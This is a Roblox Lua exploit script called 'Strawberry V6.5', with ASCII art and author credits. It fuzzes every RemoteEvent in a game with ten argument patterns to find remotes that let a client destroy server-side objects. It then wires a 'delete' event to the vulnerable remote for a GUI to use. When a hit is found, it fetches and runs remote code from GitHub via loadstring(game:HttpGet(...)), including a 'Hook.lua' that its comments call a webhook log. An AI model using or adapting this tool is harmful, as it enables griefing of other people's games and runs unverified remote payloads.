--[[
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣩⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣱⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠶⣖⠶⢤⣀⠀⢠⢷⣏⣠⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣉⣳⣤⠉⠓⣾⡿⢋⡿⠟⣒⠒⠒⠶⣤⣤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣶⣚⣫⣿⣗⠛⠛⢒⣿⣧⡀⠻⡟⠿⣭⣍⡉⠉⠉⠉⠁⠀⠀⠀
⠀⠀⠀⠀⣀⡤⠖⠚⠉⠁⠉⠛⢛⠏⠀⠈⡙⠶⠟⠀⠠⢈⣝⡓⢦⣄⡀⠀⠀⠀
⠀⠀⣠⠞⠉⣰⡶⠀⠶⠅⠀⠀⠘⠃⠀⣀⠹⡆⠀⠀⠀⡠⠈⠛⠀⠈⠙⠳⣦⠀
⢀⡾⢃⠄⠀⢠⡄⠀⠮⠇⠀⢀⠀⠿⠀⢩⡀⠀⣀⣤⣀⢈⡄⠀⠀⣖⠀⠰⠟⣧
⢸⠁⢈⡁⢠⡦⣧⡀⠀⠀⠀⠛⠀⠰⠄⠘⠁⣼⠋⠈⠹⣮⠊⠀⠀⢈⠀⠀⠀⢸
⢸⠀⠘⠃⣿⠁⠈⠛⢻⠉⠉⡙⠉⠏⢹⠉⡋⠁⠀⠀⠀⠹⡄⠀⠿⠉⠀⠶⠆⣸
⢸⢸⠆⠀⣿⠀⠀⠀⠘⠚⠀⠣⠼⠀⠘⠐⠁⠀⠀⠀⠀⠀⣿⠀⠀⠀⠴⠀⢠⡟
⠘⣧⣀⣊⣿⠀⣴⣦⠀⠀⠀⢀⠀⠀⠀⠀⣴⣦⠀⠀⠀⠀⡟⠛⠃⠀⠀⢔⡿⠁
⠀⣼⣯⡭⣧⢂⡆⠀⠀⠘⢲⣉⣳⠛⠀⠀⠈⢱⣈⡆⠀⣸⠟⣿⣪⠑⠒⢯⡀⠀
⠀⣴⠛⢷⣝⠣⣤⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡾⠋⠀⣇⢇⡀⠀⠀⠙⡆
⠸⣇⢀⣬⠿⣤⡀⣭⡀⠈⠙⣍⡍⠙⠛⠛⠛⣟⠉⠁⠐⡿⠔⢁⣼⠓⠒⠲⠶⠃
⠀⠈⠉⠁⠀⠘⢿⣖⡀⢀⡀⠀⠀⠀⠘⠱⢀⡉⣄⡄⣪⣤⣥⣿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣻⢦⣤⡦⠆⠂⣤⡀⠉⡤⠈⢸⡟⠁⠈⢿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠉⢻⣶⣤⣈⠁⣠⣌⣠⣼⢧⡀⠀⠀⣳⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠓⠒⠒⠚⠀⠈⠉⠉⠛⠋⠉⠀⠈⠳⠶⠚⠁⠀⠀⠀⠀⠀

made by C:\Drive, Saji, and Sane⠀⠀

C:\Drive - Gui, Commands, Bug Fixes
Saji - Scanner
Sane - Scanner
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

-- // V6.5 STRAWBERRY SCANNER
-- // rewrite by saji lolz
-- // my brain was completely destroyed while writing this (no sleep)
-- // chances are im the only one who can understand this alien coding style lol (I CAN, MUAHAHAHAHAHA)
-- // this version scans every remote and has a test
-- // which means theres a 99.99% chance it will detect the correct games
-- // thank you sane for the multi-arg fuzzing :3

-- // this was Saji's pain and suffering, thanks dude - C:\Drive

local timer = 0; -- // times how long it takes to load the script
local backdoorfound = false; -- // this will turn to true or false depending on if vuln found
local vulnremote = nil; -- // if a remote with a vuln or backdoor is found it will be referenced in this variable
local firemethod = 1; -- // uses defferent methods to fire remotes, since different games have different ways of firing remotes

local safetime = 0.175; -- // lower will cause faster scan times but it will mess up more and have false positives
-- // higher numbers (like 0.25 which is the default) will take longer but be a good scanner
-- // 0.25 is the best for all situations and prob wont need to be changed
local methodtime = 0.02; -- // delays the time for the remote firing methods, higher mnumber

local scanninghint = Instance.new("Hint", workspace); -- // creates a hint to track scanner progress for the skids
scanninghint.Text = "STRAWBERRY V6.5: Scanning Game. Be patient. (Check F9 menu for progress) (Game might freeze for a bit)";

coroutine.wrap(function()
	repeat
		timer += 0.01;
		task.wait(0.01);
	until backdoorfound;
end)(); -- // creates a timer in a seperate thread so we can time the scanner

local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
deletebind.Name = "deletebind";
deletebind.Event:Connect(function(item)
	if backdoorfound == true then
		if firemethod == 1 then
			vulnremote:FireServer(item);
		elseif firemethod == 2 then
			vulnremote:FireServer(nil, item);
		elseif firemethod == 3 then
			vulnremote:FireServer(nil, nil, item);
		elseif firemethod == 4 then
			vulnremote:FireServer({item});
		elseif firemethod == 5 then
			vulnremote:FireServer({Target = item});
		elseif firemethod == 6 then
			vulnremote:FireServer("Destroy", item);
		elseif firemethod == 7 then
			vulnremote:FireServer("delete", item);
		elseif firemethod == 8 then
			vulnremote:FireServer("remove", item);
		elseif firemethod == 9 then
			vulnremote:FireServer({action = "delete", object = item});
		elseif firemethod == 10 then
			vulnremote:FireServer(item.Name);
		end;
	end;
end); -- // creates a delete event with the backdoored remote so the gui can use it

local methodfound = false -- // turns "true" if a remote fire method is found

local function remoteBackdoored(remote)
	local function isDestroyed(obj)
		return obj == nil or obj.Parent == nil;
	end;
	local function testfire(item)
		pcall(function()
			firemethod = 1
			remote:FireServer(item);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 2
			remote:FireServer(nil, item);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 3
			remote:FireServer(nil, nil, item);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 4
			remote:FireServer({item});
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 5
			remote:FireServer({Target = item});
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 6
			remote:FireServer("Destroy", item);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 7
			remote:FireServer("delete", item);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 8
			remote:FireServer("remove", item);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 9
			remote:FireServer({action = "delete", object = item});
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
			firemethod = 10
			remote:FireServer(item.Name);
			wait(methodtime)
			if isDestroyed(item) then methodfound = true return else end
			wait()
		end);
	end;
	local testpart = game.Players.LocalPlayer.StarterGear or game.Players.LocalPlayer.Character.BodyColors or game.Players.LocalPlayer.Character.Head;
	testfire(testpart);
	task.wait(safetime); -- // slight delay to see if remote reacts
	print("STRAWBERRY V6.5: "..remote.Name.." /isbackdoored: "..tostring(isDestroyed(testpart)).." / "..remote:GetFullName());
	if isDestroyed(testpart) then
		vulnremote = remote;
		return true;
	end;
	return false;
end; -- // checks a remote event for a backdoor or vulnerability by firing it and seeing if it does something

local function scan()
	if backdoorfound or methodfound == true then return end;
	for i, v in ipairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			if not v.Parent then continue end;
			if v.Parent.Name == "RobloxReplicatedStorage" or v.Parent.Name == "DefaultChatSystemChatEvents" then continue end;
			if remoteBackdoored(v) == true then
				backdoorfound = true;
				print("Vulnurable remote has been found: "..v.Name);
				return; -- // backdoor found so breaks the loop
			else
				-- // keeps scanning if a backdoor isent found
			end; -- // tests remote for backdoor
		end;
	end;
end; -- // scans a place for vulnerable remotes

task.wait(1); -- // 2 sec delay before scanning to stop huge lag spike
scan(); -- // scans the WHOLE game for vuln/backdoored remotes
task.wait();
if backdoorfound then
	-- // loads up the gui and webhook log after backdoor/vuln is found :3
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/UI_Source/v6.lua"))();
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))();
	scanninghint.Text = "STRAWBERRY V6.5: Backdoor found in "..tostring(timer).." seconds! (Backdoored Remote name: "..vulnremote.Name..")";
	task.wait(10);
	scanninghint:Destroy();
else
	scanninghint.Text = "STRAWBERRY V6.5: No backdoor found srry!";
	task.wait(10);
	scanninghint:Destroy();
end;
